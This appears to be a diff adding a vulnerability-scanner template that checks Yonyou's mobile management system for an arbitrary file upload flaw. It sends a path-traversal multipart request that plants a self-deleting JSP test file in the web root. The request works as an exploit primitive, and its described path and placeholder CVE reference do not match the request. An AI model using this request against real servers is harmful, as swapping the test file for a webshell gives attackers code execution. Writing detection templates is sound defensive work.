@@ -1,0 +1,37 @@
+id: yonyou-mobile-file-upload
+
+info:
+  name: 用友移动管理系统common组件任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    漏洞源于用友移动管理系统common模块文件上传功能验证机制缺陷
+      受影响路径包含：/common/upload.ashx
+      攻击者可构造恶意文件请求包，通过上传后门文件实现服务器代码执行
+      reference:
+        - https://example.com/cve-2023-XXXXX
+  tags: 用友
+
+http:
+- raw:
+  - |
+    POST /mobsm/common/upload?category=../webapps/nc_web/maupload/img HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+    Cache-Control: no-cache
+    Connection: close
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+    Content-Disposition: form-data; name="file"; filename="NTest.jsp"
+    Content-Type: text/plain
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
